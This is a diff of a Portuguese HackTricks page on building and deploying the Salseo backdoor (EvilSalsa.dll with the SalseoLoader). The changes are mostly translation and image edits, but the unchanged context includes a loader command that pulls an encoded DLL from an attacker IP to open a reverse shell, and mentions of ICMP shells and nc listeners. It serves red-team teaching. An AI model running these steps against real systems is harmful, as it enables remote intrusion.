@@ -4,9 +4,9 @@
 
 <summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Outras formas de apoiar o HackTricks:
+Outras maneiras de apoiar o HackTricks:
 
-* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
@@ -22,17 +22,17 @@ Compile esses projetos para a arquitetura da máquina Windows onde você irá us
 
 Você pode **selecionar a arquitetura** dentro do Visual Studio na **aba "Build"** em **"Platform Target".**
 
-(\*\*Se você não encontrar essas opções, clique em **"Project Tab"** e depois em **"\<Project Name> Properties"**)
+(\*\*Se você não encontrar essas opções, clique em **"Project Tab"** e depois em **"\<Nome do Projeto> Propriedades"**)
 
-![](<../.gitbook/assets/image (132).png>)
+![](<../.gitbook/assets/image (839).png>)
 
 Em seguida, compile ambos os projetos (Build -> Build Solution) (Dentro dos logs aparecerá o caminho do executável):
 
-![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (381).png>)
 
-## Preparar o Backdoor
+## Preparar a Backdoor
 
-Primeiramente, você precisará codificar o **EvilSalsa.dll.** Para fazer isso, você pode usar o script python **encrypterassembly.py** ou compilar o projeto **EncrypterAssembly**:
+Primeiramente, você precisará codificar o **EvilSalsa.dll.** Para fazer isso, você pode usar o script python **encrypterassembly.py** ou pode compilar o projeto **EncrypterAssembly**:
 
 ### **Python**
 ```
@@ -64,7 +64,7 @@ SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <A
 ```
 ### **Obtendo um shell reverso ICMP (dll codificada já dentro da vítima)**
 
-**Desta vez, você precisa de uma ferramenta especial no cliente para receber o shell reverso. Baixe:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
+**Desta vez, você precisa de uma ferramenta especial no cliente para receber o shell reverso. Baixe em:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
 #### **Desativar Respostas ICMP:**
 ```
@@ -87,65 +87,65 @@ Abra o projeto SalseoLoader usando o Visual Studio.
 
 ### Adicione antes da função principal: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (409).png>)
 
 ### Instale o DllExport para este projeto
 
 #### **Ferramentas** --> **Gerenciador de Pacotes NuGet** --> **Gerenciar Pacotes NuGet para a Solução...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (881).png>)
 
-#### **Procure pelo pacote DllExport (usando a guia Procurar) e pressione Instalar (e aceite o popup)**
+#### **Procure pelo pacote DllExport (usando a guia Procurar), e pressione Instalar (e aceite o popup)**
 
-![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (100).png>)
 
 Na pasta do seu projeto aparecerão os arquivos: **DllExport.bat** e **DllExport\_Configure.bat**
 
-### **Desinstale o DllExport**
+### **D**esinstale o DllExport
 
 Pressione **Desinstalar** (sim, é estranho, mas confie em mim, é necessário)
 
-![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)
+![](<../.gitbook/assets/image (97).png>)
 
 ### **Saia do Visual Studio e execute DllExport\_configure**
 
 Apenas **saia** do Visual Studio
 
-Em seguida, vá para a pasta do seu **SalseoLoader** e **execute DllExport\_Configure.bat**
+Em seguida, vá para a sua **pasta SalseoLoader** e **execute DllExport\_Configure.bat**
 
-Selecione **x64** (se você for usá-lo dentro de um ambiente x64, que foi o meu caso), selecione **System.Runtime.InteropServices** (dentro de **Namespace for DllExport**) e pressione **Aplicar**
+Selecione **x64** (se você for usá-lo dentro de um ambiente x64, que foi o meu caso), selecione **System.Runtime.InteropServices** (dentro de **Namespace para DllExport**) e pressione **Aplicar**
 
-![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (882).png>)
 
 ### **Abra o projeto novamente com o Visual Studio**
 
 **\[DllExport]** não deve mais estar marcado como erro
 
-![](<../.gitbook/assets/image (8) (1).png>)
+![](<../.gitbook/assets/image (670).png>)
 
 ### Construa a solução
 
 Selecione **Tipo de Saída = Biblioteca de Classes** (Projeto --> Propriedades do SalseoLoader --> Aplicativo --> Tipo de saída = Biblioteca de Classes)
 
-![](<../.gitbook/assets/image (10) (1).png>)
+![](<../.gitbook/assets/image (847).png>)
 
 Selecione **plataforma x64** (Projeto --> Propriedades do SalseoLoader --> Compilar --> Destino da plataforma = x64)
 
-![](<../.gitbook/assets/image (9) (1) (1).png>)
+![](<../.gitbook/assets/image (285).png>)
 
-Para **construir** a solução: Build --> Build Solution (Dentro do console de saída, o caminho do novo DLL aparecerá)
+Para **construir** a solução: Build --> Build Solution (Dentro do console de saída aparecerá o caminho da nova DLL)
 
-### Teste o Dll gerado
+### Teste a Dll gerada
 
-Copie e cole o Dll onde deseja testá-lo.
+Copie e cole a Dll onde deseja testá-la.
 
 Execute:
 ```
 rundll32.exe SalseoLoader.dll,main
 ```
-Se nenhum erro aparecer, provavelmente você tem uma DLL funcional!!
+Se nenhum erro aparecer, provavelmente você tem um DLL funcional!!
 
-## Obter um shell usando a DLL
+## Obtenha um shell usando o DLL
 
 Não se esqueça de usar um **servidor HTTP** e configurar um **ouvinte nc**
 
@@ -171,7 +171,7 @@ rundll32.exe SalseoLoader.dll,main
 ```
 <details>
 
-<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprenda hacking AWS de zero a herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Outras maneiras de apoiar o HackTricks:
 
